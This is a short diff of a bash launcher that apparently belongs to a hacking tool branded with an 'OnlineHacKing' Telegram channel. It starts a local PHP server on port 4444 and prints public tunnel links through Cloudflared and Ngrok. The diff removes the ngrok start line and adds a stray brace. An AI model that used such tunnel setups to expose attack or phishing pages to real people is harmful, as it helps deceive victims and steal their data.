@@ -57,7 +57,6 @@ echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
 			   echo ""
-			   ./ngrok http 4444 > /dev/null 2>&1 &
 			   
 			   
 			   
@@ -76,7 +75,7 @@ echo ""
 			   
 			   
 			   
-			   
+}			   
 			   
 		
 			   
@@ -134,10 +133,10 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" https://$nlink
+                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Localhost Link :\e[0m\e[1;77m %s\e[0m\n" http://127.0.0.1:4444
+                           printf "\e[1;33m\e[0m\e[1;33m Localhost Link :\e[0m\e[1;77m %s\e[0m\n" http://127.0.0.1:4444/
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   rm -rf cld.log
